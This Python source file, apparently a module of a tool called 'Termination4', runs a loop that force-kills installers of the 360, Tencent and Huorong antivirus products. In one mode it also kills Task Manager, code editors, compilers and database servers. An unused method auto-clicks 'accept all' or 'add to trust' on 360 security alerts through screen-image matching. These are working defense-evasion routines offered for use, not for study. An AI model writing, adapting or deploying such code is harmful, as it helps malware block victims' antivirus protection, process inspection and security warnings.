from TLib import *
from TLib.T_imports import *


class AntiVirusSoftware(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination'):
        self.master=master
        self.Tools=master.AntiVS
        self.desc="Anti Virus Software"
        self.__init_values__()
        self.KillInstallFor360()
        self.KillInstallForTX()
        self.KillInstallForHR()
        if self.master.GetWorkMod() == "exe" and not os.path.exists("C:\\DEVELOPER.INI"):
            self.KillInstallForOther()
        self.Killer()
        #self.Accept360Window()
    def __init_values__(self):
        self.KillFlan=True
        self.BanTitle=[]
        self.BanName=[]
    def __KillInstallFor_Template__(self, BanTitle: list, BanName: list):
        self.BanTitle+=BanTitle
        self.BanName+=BanName
    def KillInstallForOther(self):
        self.__KillInstallFor_Template__([], ["frpc.exe","frps.exe",# "nginx.exe"
                                              #"python.exe", "pythonw.exe",
                                              "taskmgr.exe", "code.exe",
                                              "gcc.exe", "g++.exe", "clang.exe", "clang++.exe", "cl.exe", "make.exe", "cmake.exe",
                                              #"java.exe", "javaw.exe",
                                              "pycharm64.exe", "pycharm.exe",
                                              "mysqld.exe",# "ollama.exe"
                                              ])
    def KillInstallFor360(self):
        self.__KillInstallFor_Template__(["360安全卫士-安装", "-安装"], ["inst.exe"])
    def KillInstallForTX(self):
        self.__KillInstallFor_Template__(["电脑管家", "腾讯电脑管家在线安装程序"], ["inst.exe"])
    def KillInstallForHR(self):
        self.__KillInstallFor_Template__(["Installing Huorong", "安装火绒"], [])
    @asyncs
    def Killer(self):
        while self.KillFlan and not self.ShouldStop():
            WI=self.Tools.GetSomeWindow(self.BanTitle, self.BanName)
            if WI:
                os.system(f"taskkill /F /PID {WI["pid"]}")
                os.system(f"taskkill /F /IM {os.path.basename(WI["exe"])}")
            time.sleep(2)
    def Accept360Window(self):
        while not self.ShouldStop():
            hwnd=self.Tools.GetWindowsByClass("Q360HIPSClass")
            if hwnd:
                print("AGAINST WITH 360 !")
                #for hwnd in matchingWindows:

                #windowName = win32gui.GetWindowText(hwnd)
                #TLX, TXY, BRX, BRY = self.GetWindowCoordinates(hwnd)
                #pyautogui.click(BRX - 50, BRY - 40)
                #pyautogui.click(BRX - 50, BRY + 30)
                #windowName = win32gui.GetWindowText(hwnd)
                time.sleep(0.3)
                LX, LY, RX, RY = self.Tools.GetWindowCoordinates(hwnd)
                if not LX:
                    continue
                #if self.KeMouse.ClickTargetPNGAC(self.OCR_CloseBeliveWindow, button='left', sleep=0.1):
                #    print("Choose Close Belive Window ! Please ReStart !")
                #if self.KeMouse.ClickTargetPNGAC(self.OCR_AddToBelive, button='left', sleep=0.1):
                #    print("Choose AddToBelive ! Please ReStart !")
                #if self.KeMouse.ClickTargetPNGAC(self.OCR_NFTB, button='left', sleep=0.1):
                #    print("Choose NFTB ! Start Error!")
                #if self.KeMouse.ClickTargetPNGAC(self.OCR_Down, button='left', sleep=0.5, search_area=search_area):
                #    print("Choose Down !")
                #if self.KeMouse.ClickTargetPNGAC(self.OCR_AcceptAll, button='left', sleep=0.1, search_area=search_area):
                #    print("Choose Accept All !")
                _pos, _confidence = self.Tools.KeMouse.find_template(self.Tools.OCR_Down, search_area=(LX,LY,RX,RY))
                if not _pos or _confidence < 0.97: continue
                print(f"[OCR] Donw ({_pos[0]}, {_pos[1]}) Confidence: {_confidence}")
                self.Tools.KeMouse.click(_pos[0], _pos[1])

                time.sleep(0.2)

                #(_pos[0]+(RX-LX)//2,_pos[1]+(RY-LY)-(RY-LY)//4,RX,RY+100)
                _pos2, _confidence2 = self.Tools.KeMouse.find_template(self.Tools.OCR_AcceptAll, search_area=(_pos[0]+(RX-LX)//2,_pos[1]+3*(RY-LY)//4,RX,RY+100))
                if not _pos2: continue
                print(f"[OCR] AcceptAll ({_pos2[0]}, {_pos2[1]}) Confidence: {_confidence2}")
                if _confidence2 > 0.97: self.Tools.KeMouse.click(_pos[0], _pos[1])
                else:
                    _pos3, _confidence3 = self.Tools.KeMouse.find_template(self.Tools.OCR_AddToBelive, search_area=(LX,LY+(RY-LY)//2,RX-(RX-LX)//2,RY))
                    print(f"[OCR] AcceptAll ({_pos3[0]}, {_pos3[1]}) Confidence: {_confidence3}")
                    if not _pos3: continue
                    if _confidence3 > 0.97: self.Tools.KeMouse.click(_pos[0], _pos3[1])
            time.sleep(0.2)